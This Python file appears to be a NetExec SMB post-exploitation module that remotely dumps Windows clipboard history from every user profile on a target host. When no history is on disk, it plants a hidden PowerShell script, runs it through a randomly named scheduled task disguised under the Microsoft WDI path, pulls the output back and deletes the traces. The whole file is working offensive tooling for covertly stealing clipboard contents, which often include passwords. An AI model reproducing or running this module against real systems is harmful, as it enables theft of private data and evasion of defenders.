#!/usr/bin/env python3
#
#  clipboard_dump.py  –  NetExec SMB module (Windows 10/11 & Server 2012‑2022)
#
#  • Dumps clipboard history from disk (HistoryData JSON  +  ActivitiesCache.db)
#  • If nothing on disk, spawns an interactive Scheduled Task in the user’s
#    session which:
#         – uses WinRT Clipboard API to dump history (text)      (v1809+)
#         – falls back to Get‑Clipboard for the live item
#  • All artefacts (task, temp .ps1 + txt) are removed
#

import os, re, json, base64, sqlite3, random, string, tempfile, datetime, time
from tabulate import tabulate

class NXCModule:
    name                 = "clipboard_dump"
    description          = "Dump Windows clipboard history or live clipboard"
    supported_protocols  = ["smb"]
    opsec_safe           = True
    multiple_hosts       = True

    # ------------------------------------------------------------------ #
    #                        module‑specific options                      #
    # ------------------------------------------------------------------ #
    def options(self, ctx, opts):
        self.raw     = opts.get("RAW", "false").lower() == "true"
        self.max     = int(opts.get("MAX", "0") or 0)
        self.verbose = opts.get("VERBOSE", "false").lower() == "true"

    # ------------------------------------------------------------------ #
    #                              main loop                              #
    # ------------------------------------------------------------------ #
    def on_login(self, ctx, conn):
        smb, host = conn.conn, conn.host
        tmpdir    = os.path.join(os.path.expanduser("~"), ".nxc", "clipboard")
        os.makedirs(tmpdir, exist_ok=True)

        # enumerate local profiles
        try:
            users = [f.get_longname() for f in smb.listPath("C$", r"Users\*")
                     if f.is_directory() and f.get_longname() not in
                        (".", "..", "Public", "Default", "Default User", "All Users")]
        except Exception as e:
            ctx.log.fail(f"{host}: cannot enumerate Users – {e}")
            return

        any_output = False
        for user in users:
            rows = ( self._hist_json(smb, tmpdir, user) or
                     self._hist_sqlite(smb, tmpdir, user) or
                     self._live_clipboard(ctx, conn, smb, tmpdir, user) )

            if rows:
                self._display(ctx, host, user, rows)
                any_output = True

        if not any_output:
            ctx.log.fail(f"{host}: no clipboard history and live clipboard unavailable")

    # ------------------------------------------------------------------ #
    #                 History format #1  –  HistoryData JSON              #
    # ------------------------------------------------------------------ #
    def _hist_json(self, smb, tmp, user):
        root = fr"Users\{user}\AppData\Local\Microsoft\Windows\Clipboard\HistoryData"
        files = list(self._walk_files(smb, root))
        rows  = []
        for i, (remote, attr) in enumerate(sorted(files,
                key=lambda x: x[1].get_ctime(), reverse=True)):
            local = tempfile.mktemp(dir=tmp)
            smb.getFile("C$", remote, open(local, "wb").write)
            fmt, data = self._parse_hist_json(local)
            os.remove(local)
            if data:
                ts = datetime.datetime.fromtimestamp(attr.get_ctime())
                rows.append((i, fmt, ts, data))
        return rows

    def _parse_hist_json(self, path):
        try:
            raw = open(path, "rb").read()
            if re.fullmatch(rb"[A-Za-z0-9+/=\s]+", raw):      # plain base64 file
                return "Text", raw.decode(errors="ignore")
            blob = json.loads(raw.decode("utf‑8", "ignore"))
            data = blob.get("data") or blob.get("content") or ""
            fmt  = blob.get("format") or "Text"
            return fmt, data
        except Exception:
            return "", ""

    # ------------------------------------------------------------------ #
    #            History format #2  –  ActivitiesCache.db (Timeline)      #
    # ------------------------------------------------------------------ #
    def _hist_sqlite(self, smb, tmp, user):
        base = fr"Users\{user}\AppData\Local\ConnectedDevicesPlatform"
        try:
            l_dirs = [f.get_longname() for f in smb.listPath("C$", f"{base}\\*")
                      if f.is_directory() and f.get_longname().startswith("L.")]
        except Exception:
            return []

        for sub in l_dirs:
            rdb = f"{base}\\{sub}\\ActivitiesCache.db"
            try: smb.getAttributes("C$", rdb)
            except Exception: continue
            ldb = tempfile.mktemp(dir=tmp)
            smb.getFile("C$", rdb, open(ldb, "wb").write)
            rows = self._parse_activities(ldb)
            os.remove(ldb)
            return rows
        return []

    @staticmethod
    def _parse_activities(path):
        q = """SELECT datetime(Activity.StartTime,'unixepoch'),
                      Activity.ClipboardPayload
               FROM Activity WHERE ActivityType = 10"""
        rows = []
        with sqlite3.connect(path) as db:
            for i, (ts, payload) in enumerate(db.execute(q)):
                try:
                    blk = json.loads(payload)[0]
                    fmt, data = blk.get("format",""), blk.get("content","")
                except Exception:
                    fmt, data = "", ""
                rows.append((i, fmt, ts, data))
        return rows

    # ------------------------------------------------------------------ #
    #        Live clipboard (history + current) via Scheduled Task        #
    # ------------------------------------------------------------------ #
    def _live_clipboard(self, ctx, conn, smb, tmp, user):
        # find active session for this user
        output = conn.execute("query user", get_output=True)
        m = re.search(rf"^{re.escape(user)}\s+\S+\s+(\d+)\s+Active", output, re.I | re.M)
        if not m:
            return []
        session = m.group(1)

        rand      = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        task_name = f"\\Microsoft\\Windows\\WDI\\{rand}"
        ps_path   = f"ProgramData\\{rand}.ps1"
        out_path  = f"Users\\{user}\\AppData\\Local\\Temp\\{rand}.txt"

        # PowerShell script (WinRT history dump then fallback)
        ps_script = rf"""
try {{
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  $hist = [Windows.ApplicationModel.DataTransfer.Clipboard]::GetHistoryItemsAsync().GetAwaiter().GetResult()
  $out  = @()
  foreach ($item in $hist.Items) {{
     $dp = $item.Content
     if ($dp.Contains([Windows.ApplicationModel.DataTransfer.StandardDataFormats]::Text)) {{
        $txt = $dp.GetTextAsync().GetAwaiter().GetResult()
        $out += ($item.Timestamp.ToUniversalTime().ToString('o') + '|' + $txt)
     }}
  }}
}} catch {{ }}
if (-not $out) {{
  try {{
     $c = Get-Clipboard -Raw
     if ($c) {{ $out = (Get-Date -Format o) + '|' + $c }}
  }} catch {{ }}
}}
$out -join "`n" | Set-Content -Encoding UTF8 $env:LOCALAPPDATA\Temp\{rand}.txt
"""
        smb.putFile("C$", ps_path, ps_script.lstrip().encode())

        # create + run interactive scheduled task
        create = (f'schtasks /Create /SC ONCE /TN "{task_name}" '
                  f'/TR "powershell -Sta -NoLogo -NoProfile -Window Hidden -File C:\\{ps_path}" '
                  f'/ST 00:00 /RL HIGHEST /IT /RU "{user}" /F')
        conn.execute(create)
        conn.execute(f'schtasks /Run /TN "{task_name}"')

        # wait for output
        txt_remote = out_path
        txt_local  = tempfile.mktemp(dir=tmp)
        clip_rows  = []
        for _ in range(6):
            time.sleep(1)
            try:
                smb.getFile("C$", txt_remote, open(txt_local, "wb").write)
                lines = open(txt_local, "r", encoding="utf‑8", errors="ignore").read().splitlines()
                for idx, line in enumerate(lines):
                    if "|" in line:
                        ts, txt = line.split("|", 1)
                        clip_rows.append((idx, "Text", ts, txt))
                break
            except Exception:
                continue

        # cleanup
        conn.execute(f'schtasks /Delete /TN "{task_name}" /F')
        for path in (ps_path, txt_remote):
            try:
                smb.deleteFile("C$", path)
            except Exception:
                pass
        try:
            os.remove(txt_local)
        except Exception:
            pass

        return clip_rows

    # ------------------------------------------------------------------ #
    #                          helper utilities                           #
    # ------------------------------------------------------------------ #
    def _walk_files(self, smb, root):
        stack = [root]
        while stack:
            cur = stack.pop()
            try:
                for f in smb.listPath("C$", f"{cur}\\*"):
                    name = f.get_longname()
                    if f.is_directory() and name not in (".", ".."):
                        stack.append(f"{cur}\\{name}")
                    elif f.is_file():
                        yield f"{cur}\\{name}", f
            except Exception:
                continue

    def _decode(self, fmt, data):
        if self.raw:
            return data
        if "Text" in (fmt or "") and re.fullmatch(r"[A-Za-z0-9+/=\s]+", data):
            try:
                return base64.b64decode(data).decode("utf‑16le").strip()
            except Exception:
                pass
        return data

    def _display(self, ctx, host, user, rows):
        if self.max:
            rows = rows[: self.max]
        table = [[i, ts, fmt or "-", self._decode(fmt, d)[:80] + ("…" if len(d) > 80 else "")]
                 for i, fmt, ts, d in rows]
        ctx.log.highlight(f"{host} | {user}")
        ctx.log.highlight(tabulate(table,
                                   headers=["#", "Timestamp (UTC)", "Format", "Clipboard Entry"],
                                   tablefmt="plain"))
        if self.verbose:
            ctx.log.info(f"{host}\\{user}: dumped {len(rows)} item(s)")
